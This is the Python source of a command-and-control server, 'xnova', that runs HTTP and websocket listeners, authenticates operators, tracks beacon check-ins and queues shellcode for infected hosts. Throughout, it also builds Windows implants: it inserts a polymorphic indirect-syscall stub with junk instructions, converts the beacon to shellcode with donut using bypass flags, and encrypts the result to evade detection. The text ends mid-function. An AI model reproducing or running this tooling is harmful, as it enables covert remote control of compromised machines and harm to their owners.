import asyncio
import pathlib
import ssl, threading
import websockets
from mnemonic import Mnemonic
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding
import os, pyotp
import uuid, string, random, hashlib, jwt, datetime, sqlite3, uuid
import binascii

from flask import Flask, make_response, request
import warnings, logging
import flask.cli
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
import base64
from binascii import hexlify, unhexlify
import shutil, subprocess
import time, toml
import ast
import argparse
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from rich.console import Console
import string
app = Flask(__name__)


logging.getLogger('werkzeug').disabled = True
logging.getLogger("geventwebsocket.handler").disabled = True
app.logger.disabled = True
flask.cli.show_server_banner = lambda *args: None

server_secret = None
infrastructure_name = "war_server"
product_version = f"xnova v1.5.0 - [{infrastructure_name}]"
websocket_port = 8765
http_service_port = 3921
mnemonic = None
SERVING_INTERFACE = "0.0.0.0"
known_operators = {}
known_jwt = {}
analytics = {'operators':0, 'online':0, 'alive':0, 'dead':0, 'sleep':0, 'creds':0}
listeners = {}
certfile = './server-cert.pem'
keyfile = './server-key.pem'
cafile = './ca-cert.pem'
CONNECTIONS = {}
CLIENTS = []
CONNECTED_CLIENTS = []
PAYLOAD_GENERATION_QUEUE = []
GLOBAL_CLIENT_MESSAGE_QUEUE = []
COMPILATION_ESTIMATED_TIME = 0
module_names = {}
http_server_list = []
running_listeners_description = {}
guardrails_generation = {}
BASE_DIR = ""
generated_uuids = {}
uuid_command_queue = {}
BEACON_COMMAND_QUEUE = []
BEACON_COMMAND_QUEUE_DIRECT = {}
FIRST_COMPILATION = False
checked_uuids = {}
STARTED_LISTENERS = {
    "http":[],
    "mtls":[]
}

syscall_stub = [
    ".global syscall_exec\n",
    ".section .text\n",
    "syscall_exec:\n",
        "   mov [rsp - 0x8],  rsi\n",
        "   mov [rsp - 0x10], rdi\n",
        "   mov [rsp - 0x18], r12\n"

        "   mov eax, ecx\n",
        "   mov r12, rdx\n",
        "   mov rcx, r8\n",

        "   mov r10, r9\n",
        "   mov  rdx,  [rsp + 0x28]\n",
        "   mov  r8,   [rsp + 0x30]\n",
        "   mov  r9,   [rsp + 0x38]\n",
        
        "   sub rcx, 0x4\n",
        "   jle skip\n",

        "   lea rsi,  [rsp + 0x40]\n",
        "   lea rdi,  [rsp + 0x28]\n",

        "   rep movsq\n",
    "skip:\n",
        "   mov rcx, r12\n",

        "   mov rsi, [rsp - 0x8]\n",
        "   mov rdi, [rsp - 0x10]\n",
        "   mov r12, [rsp - 0x18]\n",

        "   jmp rcx\n"]


dead_code = [
            "   nop\n",
            "   por mm1, mm1\n",
            "   pand mm0, mm0\n"
]


MODULE_CACHE = True
IMPLANT_CACHE = True



def random_insert(list_a, element):
    pos = random.randint(4, len(list_a)-2) 
    list_a.insert(pos, element)
    return list_a

def random_insert_min_max(list_a, element):
    len_insertions = random.randint(1, 500)
    for _ in range(len_insertions):
        list_a = random_insert(list_a, element)
    return list_a


def message_encrypt_AES(message):
    try:
        key = bytes.fromhex(server_secret)
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_message = padder.update(message.encode()) + padder.finalize()

        iv = os.urandom(algorithms.AES.block_size // 8)

        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        encryptor = cipher.encryptor()

        ciphertext = encryptor.update(padded_message) + encryptor.finalize()
        return iv + ciphertext
    except:
        pass

def message_decrypt_AES(encrypted_message, key=None):
    try:
        if key == None:
            key = bytes.fromhex(server_secret)

        iv = encrypted_message[:algorithms.AES.block_size // 8]
        ciphertext = encrypted_message[algorithms.AES.block_size // 8:]

        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
        decryptor = cipher.decryptor()

        padded_message = decryptor.update(ciphertext) + decryptor.finalize()

        unpadder = padding.PKCS7(algorithms.AES.block_size).unpadder()
        decrypted_message = unpadder.update(padded_message) + unpadder.finalize()

        return decrypted_message.decode()
    except:
        pass

@app.errorhandler(404)
def not_found_error(error):
    resp = make_response('')
    resp.status_code = 404

    return resp

@app.errorhandler(500)
def internal_server_error(error):
    resp = make_response('')
    resp.status_code = 404

    return resp

@app.route('/auth', methods=['POST'])
def auth():
    try:
        secret_key = secrets.token_urlsafe(32)
        received_data = message_decrypt_AES(base64.b64decode(request.get_json()['creds'])).split(':')
        for user_id, user_data in known_operators.items():
            username = received_data[0]
            username = username[:25]
            if user_data['username'] == username and hashlib.sha512(received_data[1].encode("utf-8")).hexdigest() == user_data['password']:
                user_data['status'] = True
                payload = {
                    "sub": user_id,
                    "exp": datetime.datetime.utcnow() + datetime.timedelta(days=1)
                }

                token = jwt.encode(payload, secret_key, algorithm="HS256")
                known_jwt.update({user_id:{"jwt":token, "secret_key":secret_key}})
                resp = flask.Response("")
                resp.headers['Authorization'] = f'Bearer {token}'
                resp.headers['Version'] = product_version
                resp.headers['ServerName'] = infrastructure_name
                resp.headers['Identifier'] = server_mnemonic
                analytics_str = str(analytics)
                enc_data = hexlify(message_encrypt_AES(analytics_str)).decode('utf-8')
                resp.headers['Analytics'] = enc_data
                
                return resp
        return ""
    except Exception as err:
        print(f"[ERR] auth: {err}")

        return ""


async def websocket_close(websocket):
    await websocket.close()

def validate_auth(websocket, token):
    token_2 = token.replace('Bearer ', '')
    try:
        if token != "":
            for user_data, jwt_token in known_jwt.items():
                if jwt_token['jwt'] == token_2:
                    try:
                        decoded_payload = jwt.decode(token_2, jwt_token['secret_key'], algorithms=["HS256"])
                        exp_timestamp = decoded_payload.get("exp", 1000000)
                        current_timestamp = int(datetime.datetime.utcnow().timestamp())
                        if exp_timestamp < current_timestamp:
                            print(" expired token.")
                            asyncio.create_task(websocket_close(websocket))
                        return 0

                    except jwt.InvalidTokenError:
                        print(f" invalid token. :: {token}")
                        if websocket in CONNECTED_CLIENTS:
                            CONNECTED_CLIENTS.remove(websocket)
                        asyncio.create_task(websocket_close(websocket))

                    except jwt.ExpiredSignatureError:
                        print(" expired signrature.")
                        if websocket in CONNECTED_CLIENTS:
                            CONNECTED_CLIENTS.remove(websocket)
                        asyncio.create_task(websocket_close(websocket))

                    
        else:
            if websocket in CONNECTED_CLIENTS:
                CONNECTED_CLIENTS.remove(websocket)
            asyncio.run(websocket_close(websocket))
            return 1
    except Exception as err:
        print(f"[ERR] validate_auth: {err}")

def decryptString(ciphertext, key):
    try:
        iv = ciphertext[:16]
        ciphertext = ciphertext[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = cipher.decrypt(ciphertext)
        plaintext = unpad(plaintext, 16)
        return plaintext.decode('utf-8')
    except Exception as err:
        print(err)
        return None


def create_routes(app):
    @app.errorhandler(404)
    def not_found_error(error):
        if app in guardrails_generation:
            if guardrails_generation[app]["ip_allowed"] != flask.request.remote_addr:
                return ""
        resp = make_response('')
        resp.status_code = 404

        return resp

    @app.errorhandler(500)
    def internal_server_error(error):
        if app in guardrails_generation:
            if guardrails_generation[app]["ip_allowed"] != flask.request.remote_addr:
                return ""
        resp = make_response('')
        resp.status_code = 404

        return resp

    @app.route('/hello', methods=['GET', "POST"])
    def hello():
        try:
            print(flask.request.remote_addr)
            if app in guardrails_generation:
                if guardrails_generation[app]["ip_allowed"] != flask.request.remote_addr:
                    return ""
            print("helloooo")
            resp = flask.Response("")
            resp.status_code = 200
            resp.set_data("hello")
            return resp

        except Exception as err:
            print(err)

    @app.route('/<uuid>/<unique_id>', methods=["POST"])
    def check_uuid_post(uuid, unique_id):
        if flask.request.method == "POST":
            if uuid in BEACON_COMMAND_QUEUE_DIRECT:
                if unique_id in BEACON_COMMAND_QUEUE_DIRECT[uuid]:
                    print(f"got a response from: ({uuid}/{unique_id})")
                    recv_data = flask.request.get_data()

                    ubase_64 = base64.b64decode(recv_data.decode('utf-8'))
                    print(ubase_64)

                    recv_data = decryptString(ubase_64, uuid[:32].encode())
                    if recv_data != None:
                        encoded_data = base64.b64encode(recv_data.encode())
                        websocket = BEACON_COMMAND_QUEUE_DIRECT[uuid][unique_id]["socket"]
                        asyncio.run(websocket.send(message_encrypt_AES(f'DYNAMIC_QUEUE_RESOLVING|beacon|c|{uuid}|{encoded_data.decode()}')))
                        del BEACON_COMMAND_QUEUE_DIRECT[uuid][unique_id]
                    
                    


    @app.route('/<uuid>', methods=['GET', "POST"])
    def check_uuid(uuid):
        global GLOBAL_CLIENT_MESSAGE_QUEUE, CONNECTED_CLIENTS, uuid_command_queue

        try:
            if app in guardrails_generation:
                if guardrails_generation[app]["ip_allowed"] != flask.request.remote_addr:
                    return ""
                    
            if uuid in generated_uuids:
                print(f"[CMD] {uuid} hit.")
                generated_uuids[uuid]["status"] = "online"

                if generated_uuids[uuid]["first_seen"] == False:
                    current_timestamp = datetime.datetime.now()
                    checked_uuids[uuid] = {"last_ping":current_timestamp}
                    timestamp = str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                    generated_uuids[uuid]["first_seen"] = timestamp
                    GLOBAL_CLIENT_MESSAGE_QUEUE.append(f"DYNAMIC_QUEUE_RESOLVING|global|0|{uuid}|{timestamp}")
                    print(f"sent: {GLOBAL_CLIENT_MESSAGE_QUEUE}")

                time_difference = (datetime.datetime.now() - checked_uuids[uuid]["last_ping"]).total_seconds()
                if time_difference > 5:
                    checked_uuids[uuid] = {"last_ping":datetime.datetime.now()}
                    timestamp = str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                    generated_uuids[uuid]["last_seen"] = timestamp
                    GLOBAL_CLIENT_MESSAGE_QUEUE.append(f"DYNAMIC_QUEUE_RESOLVING|global|1|{uuid}|{timestamp}")

                if flask.request.method == "POST":
                    print("got a response")
                    recv_data = flask.request.get_data()
                    print(recv_data)
                    
                    if recv_data != "":
                        uuid_command_queue[uuid]["responses"].append(recv_data)
                    resp = flask.Response("")
                    resp.status_code = 404
                    return resp


            if uuid in uuid_command_queue:
                if flask.request.method == "GET":
                    resp = flask.Response("")
                    if len(uuid_command_queue[uuid]["code"]) > 0:
                        print("command up!")
                        resp.status_code = 200
                        shellcode = uuid_command_queue[uuid]["code"].pop(0)
                        resp.set_data(shellcode)
                        return resp
                    else:
                        resp = flask.Response("")
                        resp.status_code = 404
                        resp.set_data("")
                        return resp
                else:
                    resp = flask.Response("")
                    resp.status_code = 404
                    resp.set_data("")
                    return resp

                resp = flask.Response("")
                return resp
        except Exception as err:
            print(f"[ERR:HTTP] - Error: {err}")

def list_check(data_s, primary_key, target_value):
    if primary_key in data_s:
        dict_listt = data_s[primary_key]
        for dicttt in dict_listt:
            key_list = dicttt.keys()
            key_list = list(key_list)
            if target_value in key_list:
                return 3

            if target_value in dicttt.values():
                return True
    return False
    
def start_foreign_http_thread(object_started, http_details,listener_name ):
    global STARTED_LISTENERS
    try:
        object_started.run(host=http_details[0], port=int(http_details[1]))
    except Exception:
        console = Console()
        console.print_exception(show_locals=True)
        pass

async def listenerCommand(websocket, command):
    global guardrails_generation, STARTED_LISTENERS
    try:
        if command[1] == '0':
            data = f"DYNAMIC_QUEUE_RESOLVING|listener|0|{STARTED_LISTENERS}"
            await websocket.send(message_encrypt_AES(data))

        if command[1] == '1':
            if command[2] == 'http':
                http_details = command[3].split(":")
                listener_name = command[4]
                    
                if list_check(STARTED_LISTENERS,"http",listener_name) == 3:
                    await websocket.send(message_encrypt_AES(f"DYNAMIC_QUEUE_RESOLVING|listener|err|name|{listener_name}"))
                    return

                if list_check(STARTED_LISTENERS,"http",http_details):
                    await websocket.send(message_encrypt_AES(f"DYNAMIC_QUEUE_RESOLVING|listener|err|addr|{http_details}"))
                    return

                STARTED_LISTENERS["http"].append({listener_name:http_details})
                print(f"[STARTED] http listener at {http_details}")
                http_server_list.append(Flask(__name__))
                await websocket.send(message_encrypt_AES(f"DYNAMIC_QUEUE_RESOLVING|listener|ok"))


                http_thread = threading.Thread(target=start_foreign_http_thread, args=(http_server_list[-1], http_details, command[4],  ))
                http_thread.start()

                running_listeners_description = {command[4]:{"thread_object":http_thread, "flask_object":http_server_list[-1]}}
                if command[5] != "noguard":
                    guardrails_generation[http_server_list[-1]] = {"ip_allowed":command[5]}

                create_routes(http_server_list[-1])


    except Exception as err:
        print("[ERR] listenerCommand: " + err)
        pass

def rand_name(size=8):
    charss = string.ascii_letters + string.digits
    return ''.join(random.choice(charss) for _ in range(size))


def string_substitution(in_file_path, old_string, new_string):
    with open(in_file_path, 'r') as file_read:
        content = file_read.read()
        
    modified_content = content.replace(old_string, new_string)
        
    with open(in_file_path, 'w') as file_write:
        file_write.write(modified_content)
        
def read_binary_and_encode(file_path):
    with open(file_path, "rb") as binary_file:
        binary_content = binary_file.read()
        b64_content = base64.b64encode(binary_content).decode('utf-8')
    return b64_content

def compile_payload(args):
    global generated_uuids, COMPILATION_ESTIMATED_TIME, FIRST_COMPILATION
    # cargo install cargo-single
    start_of_compilation = datetime.datetime.now()

    
    random_folder_name = rand_name()
    while os.path.exists(random_folder_name):
        random_folder_name = rand_name()

    arguments = args.split("|")
    print(arguments)
    random_folder_name = "./implants/" + random_folder_name

    random_uuid = str(uuid.uuid4())

    try:
        os.makedirs(random_folder_name)
        print(f'[GEN] generating project with folder: {random_folder_name}')
    except Exception as err:
        print("error while creating folder: " + err)

    try:
        shutil.copytree("./code/scream/", f'{random_folder_name}/scream', dirs_exist_ok=True)
        shutil.copytree("./code/initial_beacon/", f'{random_folder_name}/initial_beacon', dirs_exist_ok=True)
    except Exception as err:
        print(f"error while copying base project to {random_folder_name}: {err}")
    print(f'[GEN] copied folder structure. : {random_uuid}')

    final_list = []
    for x in dead_code:
        final_list = random_insert_min_max(syscall_stub, x)

    print(f'[GEN] inserted code in indirect syscall stub : {random_uuid}')

    polymorphic_stub_code = ''.join(final_list)

    random_bytes = secrets.randbits(1024)
    m = hashlib.sha256()
    m.update(str(random_bytes).encode("utf-8"))
    hash_generated = m.hexdigest()

    string_substitution(f'{random_folder_name}/scream/src/main.rs', "{!ASN_stub_code_here}", polymorphic_stub_code)
    string_substitution(f'{random_folder_name}/initial_beacon/src/main.rs', "{!ASN_stub_code_here}", polymorphic_stub_code)
    print(f'[GEN] stub overwriten : {random_uuid}')


    # current_timestamp = int(datetime.datetime.utcnow().timestamp())
    generated_uuids[random_uuid] = {"status":"offline","timestamp":str(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")), "first_seen":False, "last_seen":None}


    uuid_command_queue[random_uuid] = {"code":[]}


    shutil.copyfile("./payload_encrypter.py", f'{random_folder_name}/payload_encrypter.py')
    print(f'[GEN] copied python scripts : {random_uuid}')

    string_substitution(f'{random_folder_name}/initial_beacon/src/main.rs', "{!unique_id}", random_uuid)
    http_server = arguments[2][:len(arguments[2])]
    if http_server == "/":
        http_server = arguments[2][:len(arguments[2])-1]
    string_substitution(f'{random_folder_name}/initial_beacon/src/main.rs', "{!server_address}", http_server)

    print(f'[GEN] building initial_beacon... : {random_uuid}')
    payload_compiler_1 = subprocess.run(['cargo','+nightly','build', '-Z', 'build-std=std,panic_abort', '-Z', 'build-std-features=panic_immediate_abort','--target', 'x86_64-pc-windows-gnu', '--release', '--manifest-path',random_folder_name+"/initial_beacon/Cargo.toml"], capture_output=True, text=True)
    print(f'[GEN] builded initial_beacon : {random_uuid}')

    shutil.copyfile(f"{random_folder_name}/initial_beacon/target/x86_64-pc-windows-gnu/release/initial_beacon.exe", f'{random_folder_name}/initial_beacon.exe')
    print(f'[GEN] copied initial_beacon : {random_uuid}')

    subprocess.run(["./code/donut", f"--bypass:1", "--exit:3",f"--input:{random_folder_name}/initial_beacon.exe", f"--output:{random_folder_name}/loader.bin"])
    print(f'[GEN] converted initial_beacon with donut : {random_uuid}')

    random_mal_password = rand_name(size=32)

    print(f'[GEN] encrypting initial_beacon... : {random_uuid}')
    subprocess.run(["python3",f"{random_folder_name}/payload_encrypter.py", f"{random_folder_name}/loader.bin", random_mal_password, f"{random_folder_name}/scream/encrypted_beacon"])
    print(f'[GEN] initial_beacon encrypted : {random_uuid}')

    payload_compiler_2 = subprocess.run(['cargo','+nightly', 'build', '-Z', 'build-std=std,panic_abort','-Z', 'build-std-features=panic_immediate_abort', '--target', 'x86_64-pc-windows-gnu', '--release', "--manifest-path", random_folder_name+"/scream/Cargo.toml"], capture_output=True, text=True)
    print(f'[GEN] builded main artifact : {random_uuid}')

    output_file_scream = f'{random_folder_name}/scream/target/x86_64-pc-windows-gnu/release/scream.exe'
    binary_output_b64_scream = read_binary_and_encode(output_file_scream)
    print(f'[GEN] readed and encoded : {random_uuid}')

    # shutil.rmtree(random_folder_name)

    half_size = int(len(binary_output_b64_scream)/2)
    print(f'[GEN] cleaned up - size of the implant: ({half_size*2}) : {random_uuid}')

    part_1 = binary_output_b64_scream[:half_size]
    part_2 = binary_output_b64_scream[half_size:]
    end_of_compilation = datetime.datetime.now()
    time_offset = end_of_compilation - start_of_compilation

    if FIRST_COMPILATION == False:
        FIRST_COMPILATION = True
        COMPILATION_ESTIMATED_TIME = time_offset.total_seconds() / 60
        
    print(f"[GEN] estimated compilation time: {COMPILATION_ESTIMATED_TIME:.2f}")

    return part_1, part_2, random_uuid, random_mal_password

def read_toml_file(caminho):
    with open(caminho, 'r') as arquivo:
        content = toml.load(arquivo)
    return content


def refresh_modules():
    global module_names
    print("[OK] module refresh thread")
    while True:
        time.sleep(20)
        module_path = BASE_DIR + "/code/modules"
        module_folders = [name for name in os.listdir(module_path) if os.path.isdir(os.path.join(module_path, name))]

        for f in module_folders:
            toml_content = read_toml_file(f"{module_path}/{f}/Cargo.toml")
            try:
                module_names[toml_content["package"]["name"]] = {"file_path":f"{module_path}/{f}", "module_description":toml_content["package"]["description"]}
            except:
                module_names[toml_content["package"]["name"]] = {"file_path":f"{module_path}/{f}", "module_description":"No description supplied."}

        GLOBAL_CLIENT_MESSAGE_QUEUE.append(f"DYNAMIC_QUEUE_RESOLVING|global|modules|{module_names}")

async def async_wrapper(val, payload):
    try:
        await val['socket'].send(message_encrypt_AES(payload))
        time.sleep(0.8)

    except Exception as err:
        print(f"[ERR] async_wrapper: {err}")

def threaded_payload_gen(val):
    global COMPILATION_ESTIMATED_TIME
    try:
        payload_return = compile_payload(val['args'])
        payload_uuid = payload_return[2]
        mal_key = payload_return[3]
        b64_file = [payload_return[0], payload_return[1]]
        counter = 0
        for x in b64_file:
            payload = f'DYNAMIC_QUEUE_RESOLVING|payload|{payload_uuid}|{counter}|{x}|{mal_key}|{COMPILATION_ESTIMATED_TIME}'
            counter += 1
            asyncio.run(async_wrapper(val, payload))

    except Exception as err:
        print(f"[ERR] threaded_payload_gen: {err}")

async def queue_runner():
    while True:
        time.sleep(2)
        if len(PAYLOAD_GENERATION_QUEUE) > 0:
            try:
                for key, val in enumerate(PAYLOAD_GENERATION_QUEUE):

                    thread_payload_gen_runner = threading.Thread(target=threaded_payload_gen, args=(val, ))
                    thread_payload_gen_runner.start()

                    del PAYLOAD_GENERATION_QUEUE[key]
            except Exception as err:
                print(f"[ERR] queue_runner: {err}")

async def global_queue_runner():
    global GLOBAL_CLIENT_MESSAGE_QUEUE, CONNECTED_CLIENTS
    print("[OK] global queue runner...")

    while True:
        time.sleep(0.2)
        if len(GLOBAL_CLIENT_MESSAGE_QUEUE) > 0:
            if len(CONNECTED_CLIENTS) > 0:
                SENT_TO = []
                for i in enumerate(CONNECTED_CLIENTS):
                    if i not in SENT_TO:
                        time.sleep(1)
                        try:
                            await i[1].send(message_encrypt_AES(GLOBAL_CLIENT_MESSAGE_QUEUE[0]))
                        except Exception as err:
                            try:
                                CONNECTED_CLIENTS.remove(i)
                            except:
                                pass
                            continue
                        SENT_TO.append(i)
                SENT_TO = []
                GLOBAL_CLIENT_MESSAGE_QUEUE.pop(0)


async def update_server_statistics():
    global generated_uuids
    try:
        while True:
            time.sleep(2)
            if len(generated_uuids) > 0:
                GLOBAL_CLIENT_MESSAGE_QUEUE.append(f"DYNAMIC_QUEUE_RESOLVING|global|3|{generated_uuids}")
                
    except Exception as err:
        print(f"[ERR] update_server_statistics: {err}")


async def generateCommand(websocket, command):
    command_args = "|".join(command)
    PAYLOAD_GENERATION_QUEUE.append({"args":command_args, "socket":websocket})
    queue_position = len(PAYLOAD_GENERATION_QUEUE)
    data = '\n[Payload Generation]\n'

    if command[1] == "tcp":
        data += f'Position in queue - {queue_position}\n '
        data += f'Generating payload based in "{command[1]}" protocol.\n '
        data += f'Remote: {command[2]}\n '
        data += f'Locale: {"Unused" if command[3] == "None" else command[3]}\n '
        data += f'Killdate: {"Unused" if command[4] == "None" else command[4]}\n '
        data += f'Disposable: {"Yes" if command[5] == "True" else "No"}\n '
        data += f'Sleep: {command[6]}'
    if command[1] == "http":
        data += f'Position in queue - {queue_position}\n '
        data += f'Generating payload based in "{command[1]}" protocol.\n '
        data += f'Remote: {command[2]}\n '
        data += f'Locale: {"Unused" if command[3] == "None" else command[3]}\n '
        data += f'Killdate: {"Unused" if command[4] == "None" else command[4]}\n '
        data += f'Disposable: {"Yes" if command[5] == "True" else "No"}\n '
        data += f'Sleep: {command[6]}'

    await websocket.send(message_encrypt_AES(data))

async def chatCommand(websocket, command):
    global CLIENTS
    token = websocket.request_headers.get("Authorization", "").replace('Bearer ', '')
    try:
        if command[1] == '0':
            for user_id, jwt in known_jwt.items():
                if jwt['jwt'] == token:
                    username = known_operators[user_id]['username']
                    print(f'Username: {username} | Jwt: {token}')
                        
                    if all(d.get('socket') != websocket for d in CLIENTS):
                        CLIENTS.append({'jwt':jwt['jwt'], 'socket':websocket, 'username':username})

                    print(CLIENTS)
                    user_count = len(CLIENTS)
                    data = f'DYNAMIC_QUEUE_RESOLVING|chat|setup|{username}\public\{user_count}'
                    await websocket.send(message_encrypt_AES(data))
                    break

        if command[1] == '1':
            position = None
            token = websocket.request_headers.get("Authorization", "").replace('Bearer ', '')
            for i, clientData in enumerate(CLIENTS):
                if clientData['socket'] == websocket:
                    position = i
                    break

            data = f"DYNAMIC_QUEUE_RESOLVING|chat|message| \n  {CLIENTS[i]['username']} # {command[2]}"
            selfCounter = False
            if position != None:
                for i, clientData in enumerate(CLIENTS):
                        
                    if clientData['socket'] == websocket and selfCounter == False:
                        selfCounter = True
                        await websocket.send(message_encrypt_AES(data))

                    if clientData['socket'] == websocket and selfCounter == True:
                        continue

                    if clientData['jwt'] == token and selfCounter == True:
                        continue

                    await clientData['socket'].send(message_encrypt_AES(data))
                print(CLIENTS)
            selfCounter = False

    except websockets.exceptions.ConnectionClosedError:
        for i, data in enumerate(CLIENTS):
            if data.get("socket") == websocket:
                CLIENTS.pop(i)

        for i, data in list(known_jwt.items()):
            if data == token:
                del known_jwt[i]
    
    except asyncio.exceptions.IncompleteReadError:
        pass



async def operatorCommand(websocket, command):
    try:
        print(command)
        if command[1] == '0':
            data = "\n[ Operators ]\n"
            for user_id, user_data in known_operators.items():
                if user_data['status'] == True:
                    status = "Online"
                else:
                    status = "Offline"
                data += f"{Fore.CYAN}User:{Style.RESET_ALL} {user_data['username']: <25} | {Fore.CYAN}Status:{Style.RESET_ALL} {status}\n"
            await websocket.send(message_encrypt_AES(data))
        if command[1] == '1':
            if len(command) == 4:
                username = command[2]
                username = username[:25]

                password = command[3]
                random_uuid = str(uuid.uuid4())
                for user_id, user_data in known_operators.items():
                    if user_data['username'] == username:
                        data = f"\n[ Operators ]\nUser: {Fore.CYAN}{username}{Style.RESET_ALL} already exists.\n"
                        await websocket.send(message_encrypt_AES(data))
                        return 1
                known_operators[random_uuid] = {"username":username, "password":password, "totp":None, "last_seen":None, "history":None, "first_use":0, "jwt":None, "status":None}
                data = f"\n[ Operators ]\nUser: {Fore.CYAN}{username}{Style.RESET_ALL} created successfully.\n"
                await websocket.send(message_encrypt_AES(data))

        if command[1] == '2':
            data = ""
            if len(command) == 4:
                username = command[2]
                password = hashlib.sha512(command[3].encode("utf-8")).hexdigest()
                for user_id, user_data in known_operators.items():
                    if user_data['username'] == username and user_data['password'] == password:
                        del known_operators[user_id]
                        data = f"\n[ Operators ]\nUser: {Fore.CYAN}{username}{Style.RESET_ALL} deleted successfully.\n"
                        break

                    if user_data['username'] == username and user_data['password'] != password:
                        data = f"\n[ Operators ]\nwrong password for user: {Fore.CYAN}{username}{Style.RESET_ALL}.\n"
                        break
                if data == "":
                    data = f"\n[ Operators ]\nUser: {Fore.CYAN}{username}{Style.RESET_ALL} not found."
                await websocket.send(message_encrypt_AES(data))

        if command[1] == '3':
            data = ""
            if len(command) == 5:
                username = command[2]
                password = hashlib.sha512(command[3].encode("utf-8")).hexdigest()
                newpassword = command[4]
                for user_id, user_data in known_operators.items():
                    if user_data['username'] == username and user_data['password'] == password:
                        known_operators[user_id]['password'] = newpassword
                        data = f"\n[ Operators ]\nUser: {Fore.CYAN}{username}{Style.RESET_ALL} password changed successfully.\n"
                        break

                    if user_data['username'] == username and user_data['password'] != password:
                        data = f"\n[ Operators ]\nwrong password for user: {Fore.CYAN}{username}{Style.RESET_ALL}.\n"
                        break

                if data == "":
                    data = f"\n[ Operators ]\nUser: {Fore.CYAN}{username}{Style.RESET_ALL} not found."
                await websocket.send(message_encrypt_AES(data))
            
    except Exception as err:
        print(f"[ERR] operatorCommand: {err}")
        pass

async def pendingCommand(websocket, command):
    if len(generated_uuids) > 0:
        final_dat = ""
        for uuid, info in generated_uuids.items():
            status = info['status']
            timestamp = info['timestamp']
            final_dat += uuid + " - Status: " + status + " - Timestamp: " + timestamp + "\n"
        data = f"DYNAMIC_QUEUE_RESOLVING|pending|{final_dat}"
        await websocket.send(message_encrypt_AES(data))

async def executeCommand(websocket, command):
    try:
        command = command.split("|")
        if command[0] == "operator":
            await operatorCommand(websocket, command)
        if command[0] == "listener":
            await listenerCommand(websocket, command)
        if command[0] == "generate":
            await generateCommand(websocket, command)
        if command[0] == "chat":
            await chatCommand(websocket, command)
        if command[0] == "pending":
            await pendingCommand(websocket, command)
        if command[0] == "beacon":
            BEACON_COMMAND_QUEUE.append([command, websocket])
            
    except Exception:
        console = Console()
        console.print_exception(show_locals=True)
        pass
            
def command_beacons():
    global BEACON_COMMAND_QUEUE_DIRECT
    print("[OK] beacon commander thread")
    while True:
        time.sleep(1)
        if len(BEACON_COMMAND_QUEUE) > 0:
            command = BEACON_COMMAND_QUEUE[0][0]
            socket = BEACON_COMMAND_QUEUE[0][1]
            beacon_id = command[1]
            beacon_commands = ast.literal_eval(command[2])

            print(f"list_of_args: {beacon_id} {beacon_commands}")

            num_letters = random.randint(9, 15) 
            unique_id = ''.join(random.choices(string.ascii_letters, k=num_letters))  # Gera as letras aleatórias


            try:
                if len(BEACON_COMMAND_QUEUE_DIRECT[beacon_id][beacon_id]["command"]) > 0 or len(BEACON_COMMAND_QUEUE_DIRECT[beacon_id][beacon_id]["command"]) == 0:
                    BEACON_COMMAND_QUEUE_DIRECT[beacon_id][unique_id]["command"].append(beacon_commands)
                    BEACON_COMMAND_QUEUE_DIRECT[beacon_id][unique_id]["socket"] = socket
                    print(f"appended - {BEACON_COMMAND_QUEUE_DIRECT}")
            except:
                BEACON_COMMAND_QUEUE_DIRECT[beacon_id] = {unique_id:{"command":[], "socket":None}}
                BEACON_COMMAND_QUEUE_DIRECT[beacon_id][unique_id]["command"].append(beacon_commands)
                BEACON_COMMAND_QUEUE_DIRECT[beacon_id][unique_id]["socket"] = socket
                print(f"created new - {BEACON_COMMAND_QUEUE_DIRECT}")


            BEACON_COMMAND_QUEUE.pop(0)

def compile_module_thread(target_uuid, module_name, module_args, unique_id):
    global COMPILED_MODULES_QUEUE, uuid_command_queue
    print(f"[GEN:MOD] compiling: {module_name} - {module_args} for {target_uuid}")
    target_path = module_names[module_name]["file_path"]

    cache_check = False
    if MODULE_CACHE == True:
        cache_check = os.path.exists(f"./cache/{module_name}_cache/")
        if cache_check:    
            print("already cached.")
            main_source_original = open(f"{target_path}/src/main.rs", 'rb').read()
            cargo_file_original = open(f"{target_path}/Cargo.toml", 'rb').read()

            open(f"./cache/{module_name}_cache/src/main.rs", 'wb').write(main_source_original)
            open(f"./cache/{module_name}_cache/Cargo.toml", 'wb').write(cargo_file_original)
        else:
            print("not cached.")
        

    if MODULE_CACHE == True and cache_check == True:
        print("(cached build)")
        random_folder_name = rand_name()
        random_folder_name = "./compiled_modules/" + random_folder_name + "/" + module_name
        os.makedirs(random_folder_name)

        shutil.copytree(f"./cache/{module_name}_cache/", f"{random_folder_name}", dirs_exist_ok=True)
        string_substitution(f'{random_folder_name}/src/main.rs', "{!unique_command_id}", unique_id)
        print(f"[GEN:MOD] created folder structure ({module_name} - {module_args}) for {target_uuid} (cached build)")
        subprocess.run(['cargo','+nightly','build', '-Z', 'build-std=std,panic_abort', '-Z', 'build-std-features=panic_immediate_abort','--target', 'x86_64-pc-windows-gnu', '--release','--manifest-path',random_folder_name+"/Cargo.toml"], capture_output=True, text=True)
        print(f"[GEN:MOD] compiled module ({module_name} - {module_args}) for {target_uuid} (cached build)")
        subprocess.run(["./code/donut", f"--input:{random_folder_name}/target/x86_64-pc-windows-gnu/release/{module_name}.exe", "--exit:3","--bypass:1", f"--output:{random_folder_name}/loader.bin"])
        print(f"[GEN:MOD] converted ({module_name} - {module_args}) to shellcode for {target_uuid} (cached build)")
        iv = os.urandom(AES.block_size)
        iv_hex = binascii.hexlify(iv).decode('utf-8')
        cipher = AES.new(target_uuid[:32].encode('utf-8'), AES.MODE_CBC, iv)
        with open(f"{random_folder_name}/loader.bin", 'rb') as infile:
            plaintext = infile.read()
            first_16_bytes = plaintext[:16]
            hex_representation = ' '.join(f'{byte:02x}' for byte in first_16_bytes)
            print(hex_representation)
            print(f"len of infile: {len(plaintext)} (cached build)")
